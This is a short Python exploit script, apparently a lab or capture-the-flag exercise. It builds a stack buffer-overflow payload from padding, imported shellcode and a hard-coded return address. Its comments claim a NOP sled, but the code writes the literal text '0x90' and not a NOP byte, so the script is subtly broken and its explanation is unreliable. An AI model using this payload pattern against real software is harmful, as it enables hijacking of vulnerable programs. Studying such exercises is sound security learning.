#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(b'0x90' + (0x70-56)*b'A'+shellcode+(8*b'A')+(2+0x7ffffff6d4e8).to_bytes(8,"little"))
# adding a big NOP sled before the shellcode so the return address doesn’t have to be super precise
# can no longer write the return address into it bc we don't know the exact offset
# aren't subtracting 54 bc we have 2 byte noop --> subtracting 56